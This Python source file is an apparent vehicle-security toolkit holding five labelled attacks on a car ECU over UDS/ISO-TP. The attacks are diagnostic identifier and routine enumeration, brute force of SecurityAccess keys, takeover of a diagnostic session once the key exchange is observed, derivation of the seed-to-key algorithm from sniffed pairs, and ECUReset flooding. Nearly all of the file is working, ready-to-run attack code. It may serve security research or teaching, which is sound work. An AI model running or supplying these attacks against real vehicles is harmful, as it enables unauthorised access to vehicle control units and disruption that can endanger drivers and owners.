import time                         # Timing: delays, timeouts, brute-force pacing
import config                        # CAN IDs and addressing constants
import utils                         # Utility helpers (kept for project consistency)
from transport import tm             # Transport manager: ISO-TP send/receive + queue handling

# ---------------- BRUTE-FORCE KEY RANGE ----------------
# Purpose:
# Brute-force candidate keys for SecurityAccess key step (27 02) within a fixed integer range.
KEY_MIN = 0x11222000
KEY_MAX = 0x11222FFF

# ---------------- ISO-TP WRAPPERS ----------------
# Purpose: Keep calling style consistent and short.
def ISOTP_SEND(data, txid, rxid):
    tm.send(data, txid, rxid)

def ISOTP_RECEIVE(txid, rxid, timeout=0.0):
    return tm.receive(txid, rxid, timeout)

def pretty_hex(b: bytes) -> str:
    # Human-readable hex string for debug output/logging
    return " ".join(f"{x:02X}" for x in b)

# ==========================================================
# ATTACK 1: UDS ENUMERATION (DIDs + RIDs)
# ==========================================================
def UDS_ENUMERATE_DIDS_AND_RIDS():
    """
    Enumerate:
    - DIDs (ReadDataByIdentifier, service 0x22)
    - RIDs (RoutineControl, service 0x31)

    Purpose:
    Map what the ECU exposes in the current active session:
    - Which DIDs return positive responses (0x62 ...)
    - Which DIDs fail with NRC 0x22 (ConditionsNotCorrect)
    - Which RIDs accept StartRoutine (0x31 01) and/or return GetResults (0x31 03)
    - Which RIDs fail with NRC 0x7E (RequestNotAllowed)
    """
    tm.clear_queues() # Fix buffering (avoid reading stale responses)

    # Physical addressing IDs used for this scan
    TXID = config.ID_ECU_PHYSICAL
    RXID = config.ID_ECU_RESPONSE

    # Label used only for logs (does not change ECU session)
    session_name = "CurrentSession"
    
    # ---------------- INTERNAL DID SCANNER ----------------
    # Purpose:
    # Send: 22 <DID_H> <DID_L>
    # Expect positive: 62 <DID_H> <DID_L> <DATA...>
    # Track NRC 7F 22 22 (ConditionsNotCorrect) separately.
    def _scan_dids(session_name, start_did=0xF000, end_did=0xF1FF, timeout=0.5):
        dids_ok = {}       # DID -> data bytes returned (positive response)
        dids_nrc22 = {}    # DID -> full negative response bytes when NRC=0x22

        print(f"\n=== [DID SCAN] Session '{session_name}' (0x22, range 0x{start_did:04X}–0x{end_did:04X}) ===")
        
        for did in range(start_did, end_did + 1):
            # Split DID into high/low bytes
            did_h, did_l = (did >> 8) & 0xFF, did & 0xFF

            # Build ReadDataByIdentifier request
            req = bytes([0x22, did_h, did_l])

            # Send request and wait for response
            ISOTP_SEND(req, txid=TXID, rxid=RXID)
            resp = ISOTP_RECEIVE(txid=TXID, rxid=RXID, timeout=timeout)
            
            # Ignore empty/short replies
            if resp is None or len(resp) < 3:
                continue
            
            # Positive response: 62 DID_H DID_L ...
            if resp[0] == 0x62 and resp[1] == did_h and resp[2] == did_l:
                data = resp[3:]
                dids_ok[did] = data
                print(f"[+] DID 0x{did:04X} supported in '{session_name}' | Resp: {pretty_hex(resp)}")
                continue

            # Specific negative response: 7F 22 22 (ConditionsNotCorrect)
            if resp[0] == 0x7F and resp[1] == 0x22 and resp[2] == 0x22:
                dids_nrc22[did] = resp
                print(f"[!] DID 0x{did:04X} → 7F 22 22 (ConditionsNotCorrect) | Resp: {pretty_hex(resp)}")
                continue

        return dids_ok, dids_nrc22

    # ---------------- INTERNAL RID SCANNER ----------------
    # Purpose:
    # For each RID:
    # 1) Try StartRoutine: 31 01 RID_H RID_L
    #    Positive: 71 01 ...
    #    Negative example tracked: 7F 31 7E (RequestNotAllowed)
    # 2) If StartRoutine supported, try GetResults: 31 03 RID_H RID_L
    #    Positive: 71 03 ...
    def _scan_rids(session_name, start_rid=0x1000, end_rid=0x1600, timeout=0.5):
        rids_ok = {}      # RID -> dict with start/result support flags
        rids_nrc7e = {}   # RID -> dict describing which phase failed and the response

        print(f"\n=== [RID SCAN] Session '{session_name}' (0x31, range 0x{start_rid:04X}–0x{end_rid:04X}) ===")

        for rid in range(start_rid, end_rid + 1):
            # Split RID into high/low bytes
            rid_h, rid_l = (rid >> 8) & 0xFF, rid & 0xFF

            # Track support for each phase
            info_ok = {"start_supported": False, "result_supported": False}

            # ---------- Phase 1: StartRoutine (31 01) ----------
            req_start = bytes([0x31, 0x01, rid_h, rid_l])
            ISOTP_SEND(req_start, txid=TXID, rxid=RXID)
            resp_start = ISOTP_RECEIVE(txid=TXID, rxid=RXID, timeout=timeout)

            if resp_start is not None and len(resp_start) >= 3:
                # Positive response: 71 01 ...
                if resp_start[0] == 0x71 and resp_start[1] == 0x01:
                    info_ok["start_supported"] = True
                    print(f"[+] RID 0x{rid:04X} START supported in '{session_name}' | Resp: {pretty_hex(resp_start)}")

                # Negative response: 7F 31 7E (RequestNotAllowed)
                elif resp_start[0] == 0x7F and resp_start[1] == 0x31 and resp_start[2] == 0x7E:
                    rids_nrc7e[rid] = {"phase": "Start", "resp": resp_start}
                    print(f"[!] RID 0x{rid:04X} START → 7F 31 7E (RequestNotAllowed) | Resp: {pretty_hex(resp_start)}")
                    continue
            
            # ---------- Phase 2: GetResults (31 03) ----------
            # Only attempted if StartRoutine was accepted.
            if info_ok["start_supported"]:
                req_res = bytes([0x31, 0x03, rid_h, rid_l])
                ISOTP_SEND(req_res, txid=TXID, rxid=RXID)
                resp_res = ISOTP_RECEIVE(txid=TXID, rxid=RXID, timeout=timeout)

                if resp_res is not None and len(resp_res) >= 3:
                    # Positive response: 71 03 ...
                    if resp_res[0] == 0x71 and resp_res[1] == 0x03:
                        info_ok["result_supported"] = True
                        print(f"[+] RID 0x{rid:04X} RESULT supported in '{session_name}' | Resp: {pretty_hex(resp_res)}")

            # Store any RID that supports at least one phase
            if info_ok["start_supported"] or info_ok["result_supported"]:
                rids_ok[rid] = info_ok

        return rids_ok, rids_nrc7e

    # Execute scans in current session context
    dids_ok, dids_nrc22 = _scan_dids(session_name)
    rids_ok, rids_nrc7e = _scan_rids(session_name)
    
    # Summary (report printing kept minimal here but logic above is executed)
    print(f"[*] Session '{session_name}' → {len(dids_ok)} DIDs accessible, {len(dids_nrc22)} DIDs with NRC 0x22")
    print(f"[*] Session '{session_name}' → {len(rids_ok)} RIDs accessible, {len(rids_nrc7e)} RIDs with NRC 0x7E")
    print("[*] UDS DID/RID enumeration (current session only) completed.")

# ==========================================================
# ATTACK 2: SECURITY ACCESS BRUTE FORCE (27 01 / 27 02)
# ==========================================================
def BRUTE_FORCE_ATTACK():
    """
    Brute-force SecurityAccess key within [KEY_MIN..KEY_MAX].

    Flow:
    1) Request seed: 27 01
       Expect: 67 01 <seed...>
    2) For each candidate key:
       Send: 27 02 <key...>
       Expect success: 67 02 ...
       Stop if ECU lockout: 7F 27 33
    """
    tm.clear_queues() # Fix buffering
    
    # 1) Request seed: 27 01
    req_seed = bytes([0x27, 0x01])
    print(f"[ATTACK] → 0x{config.ID_ECU_PHYSICAL:03X} : {pretty_hex(req_seed)}")
    ISOTP_SEND(req_seed, txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE)

    resp = ISOTP_RECEIVE(txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE, timeout=5.0)
    if resp is None:
        print("[ATTACK] No response to 27 01")
        return

    print(f"[ATTACK] ← 0x{config.ID_ECU_RESPONSE:03X} : {pretty_hex(resp)}")

    # Expect 67 01 <seed>
    if not (len(resp) >= 3 and resp[0] == 0x67 and resp[1] == 0x01):
        print("[ATTACK] Unexpected seed response")
        return

    # Extract seed and infer key length from seed length (project design choice)
    seed_bytes = resp[2:]
    key_len = len(seed_bytes)

    print(f"[ATTACK] Seed: {seed_bytes.hex()} (len={key_len})")
    print(f"[ATTACK] Brute force keys from 0x{KEY_MIN:08X} to 0x{KEY_MAX:08X}")

    # 2) Brute-force keys in the configured integer range
    attempts = 0
    for k in range(KEY_MIN, KEY_MAX + 1):
        key_bytes = k.to_bytes(key_len, byteorder="big")   # Convert integer to fixed-length bytes
        frame = bytes([0x27, 0x02]) + key_bytes            # Build SecurityAccess key request

        ISOTP_SEND(frame, txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE)

        # Wait for response per attempt (original behavior)
        resp2 = ISOTP_RECEIVE(txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE, timeout=2.0)

        attempts += 1
        if attempts % 50 == 0:
            # Overwrite same line using carriage return to show progress
            print(f"[ATTACK] Attempts: {attempts}, last key: 0x{k:08X}", end="\r")

        if resp2 is None:
            continue

        # Positive response indicates key accepted: 67 02 ...
        if len(resp2) >= 2 and resp2[0] == 0x67 and resp2[1] == 0x02:
            print()
            print(f"[ATTACK] SUCCESS after {attempts} attempts")
            print(f"[ATTACK] Key int   : 0x{k:08X}")
            print(f"[ATTACK] Key bytes : {pretty_hex(key_bytes)}")
            print(f"[ATTACK] ECU resp  : {pretty_hex(resp2)}")
            return

        # Lockout condition (ECU refuses further attempts): 7F 27 33
        if len(resp2) >= 3 and resp2[0] == 0x7F and resp2[1] == 0x27 and resp2[2] == 0x33:
            print()
            print("[ATTACK] ECU entered lockout (7F 27 33). Stopping.")
            return

    print()
    print("[ATTACK] Exhausted key range, no valid key found.")

# ==========================================================
# ATTACK 3: MITM (POST-SECURITY-ACCESS SESSION TAKEOVER)
# ==========================================================
def MITM_ATTACK():
    """
    MITM-style flow (logic depends on project topology).

    Behavior:
    1) Wait until we observe ECU positive key response (67 02) using ISO-TP receive.
    2) Immediately request Extended Session (10 03).
    3) If accepted (50 03), keep session alive by sending TesterPresent (3E 00) every 2 seconds.
    """
    tm.clear_queues() # Fix buffering
    print("[MITM] Waiting (ISO-TP) for ECU positive key response (67 02)...")

    # 1) Observe decoded ISO-TP/UDS payloads until 67 02 appears
    while True:
        resp = ISOTP_RECEIVE(txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE, timeout=0.5)
        if resp is None:
            continue

        if len(resp) >= 2 and resp[0] == 0x67 and resp[1] == 0x02:
            print(f"[MITM] Saw 67 02 from ECU (decoded UDS): {pretty_hex(resp)}")
            break

    # 2) Request Extended Diagnostic Session: 10 03
    frame = bytes([0x10, 0x03])
    print(f"[MITM] → 0x{config.ID_ECU_PHYSICAL:03X} : {pretty_hex(frame)} (request Extended Session)")
    ISOTP_SEND(frame, txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE)

    resp = ISOTP_RECEIVE(txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE, timeout=5.0)
    if resp is None:
        print("[MITM] No response to 10 03")
        return

    print(f"[MITM] ← 0x{config.ID_ECU_RESPONSE:03X} : {pretty_hex(resp)}")

    # Expect positive session response: 50 03
    if not (len(resp) >= 2 and resp[0] == 0x50 and resp[1] == 0x03):
        print("[MITM] ECU did not accept Extended Session (no 50 03). Abort.")
        return

    print("[MITM] Extended Session is ON. Starting periodic TesterPresent every 2 seconds...")

    # 3) Keep-alive loop using TesterPresent: 3E 00
    tp_frame = bytes([0x3E, 0x00])
    while True:
        print(f"[MITM] → 0x{config.ID_ECU_PHYSICAL:03X} : {pretty_hex(tp_frame)} (TesterPresent)")
        ISOTP_SEND(tp_frame, txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE)

        resp_tp = ISOTP_RECEIVE(txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE, timeout=2.0)
        if resp_tp is not None:
            print(f"[MITM] ← 0x{config.ID_ECU_RESPONSE:03X} : {pretty_hex(resp_tp)}")
        else:
            print("[MITM] No TP response (ECU may still be fine).")

        time.sleep(2.0)

# ==========================================================
# ATTACK 4: SEED/KEY REVERSE ENGINEERING (BASIC HEURISTICS)
# ==========================================================
def REVERSE_ENGINEERING_ATTACK():
    """
    Attempt to infer a simple seed->key relationship from 3 captured pairs.

    Captures:
    - 67 01 <seed...>
    - 67 02 <key...>

    Tries simple models:
    - k = s + C   (mod 2^(8L))
    - k = s - C
    - k = s XOR C
    - k = s * C   (mod 2^(8L)) if divisible/consistent

    Prints:
    - Which model matched all captured pairs
    - The constant
    - Recomputed keys for verification
    """
    tm.clear_queues() # Fix buffering

    # ===== STEP 1: CAPTURE 3 SEED/KEY EXCHANGES =====
    DATA_LOG = []
    num = 0
    seed_flag = 0
    key_flag = 0
    seed_bytes = b""
    key_bytes = b""

    print("[REVERSE] Waiting for 3 exchanges of Seed/Key on bus...")

    while num < 3:
        resp = ISOTP_RECEIVE(txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE, timeout=0.5)
        if resp is None:
            continue

        # Seed response: 67 01 <seed>
        if len(resp) >= 2 and resp[0] == 0x67 and resp[1] == 0x01:
            seed_bytes = resp[2:]
            seed_flag = 1
            print(f"  Got Seed: {seed_bytes.hex()}")

        # Key response: 67 02 <key>
        if len(resp) >= 2 and resp[0] == 0x67 and resp[1] == 0x02:
            key_bytes = resp[2:]
            key_flag = 1
            print(f"  Got Key:  {key_bytes.hex()}")

        # Once both seed and key are observed, store the pair
        if seed_flag and key_flag:
            DATA_LOG.append((seed_bytes, key_bytes))
            num += 1
            seed_flag = 0
            key_flag = 0
            print(f"  Captured pair {num}/3")

    # ===== STEP 2: TEST SIMPLE ALGORITHMS =====
    print("Computing Algorithm...")

    seed0, key0 = DATA_LOG[0]
    L = len(seed0)                 # Bytes per seed/key
    M = 1 << (8 * L)               # Modulus for wrap-around arithmetic

    s0 = int.from_bytes(seed0, "big")
    k0 = int.from_bytes(key0, "big")

    # Candidate constants derived from first pair
    C_add = (k0 - s0) % M
    C_sub = (s0 - k0) % M
    C_xor = s0 ^ k0
    C_mul = k0 // s0 if s0 != 0 and (k0 % s0) == 0 else None

    # Assume all models work, then disprove by checking all pairs
    add_ok = True
    sub_ok = True
    xor_ok = True
    mul_ok = True

    for seed_b, key_b in DATA_LOG:
        s = int.from_bytes(seed_b, "big")
        k = int.from_bytes(key_b, "big")

        if (s + C_add) % M != k: add_ok = False
        if (s - C_sub) % M != k: sub_ok = False
        if (s ^ C_xor) != k: xor_ok = False
        if C_mul is None or (s * C_mul) % M != k: mul_ok = False

    # Decide which algorithm matched all 3 pairs
    alg = None
    CONST = 0
    if add_ok:
        alg = "add"
        CONST = C_add
    elif sub_ok:
        alg = "sub"
        CONST = C_sub
    elif xor_ok:
        alg = "xor"
        CONST = C_xor
    elif mul_ok:
        alg = "mul"
        CONST = C_mul
    else:
        print("No valid algorithm found.")
        return

    print(f"Algorithm: {alg}")
    print(f"Constant:  0x{CONST:0{L*2}X}")

    # ===== STEP 3: RECOMPUTE KEYS FOR VERIFICATION =====
    print("\nCorrect keys verification:")
    for seed_b, _ in DATA_LOG:
        s = int.from_bytes(seed_b, "big")
        if alg == "add": k_new = (s + CONST) % M
        elif alg == "sub": k_new = (s - CONST) % M
        elif alg == "xor": k_new = s ^ CONST
        elif alg == "mul": k_new = (s * CONST) % M
        print(k_new.to_bytes(L, "big").hex().upper())

# ==========================================================
# ATTACK 5: ECU RESET SPAMMING
# ==========================================================
def RESER_ECU_SPAMMING(duration_seconds):
    """
    Flood ECU with ECUReset requests (11 01) for a fixed duration.

    Purpose:
    Stress ECU reset handling or simulate a disruptive reset spam attack.
    """
    tm.clear_queues() # Fix buffering
    req = bytes([0x11, 0x01])   # UDS ECUReset (subfunction 0x01)

    start_time = time.time()
    frame_count = 0

    while time.time() - start_time < duration_seconds:
        try:
            print(f"[ATTACK] → 0x{config.ID_ECU_PHYSICAL:03X} : {pretty_hex(req)}")
            ISOTP_SEND(req, txid=config.ID_ECU_PHYSICAL, rxid=config.ID_ECU_RESPONSE)
            frame_count += 1
        except Exception:
            # Ignore send errors to keep attack running
            continue

    print(f"[ECU Spamming] Sent {frame_count} frames with ID {config.ID_ECU_PHYSICAL:03X}")
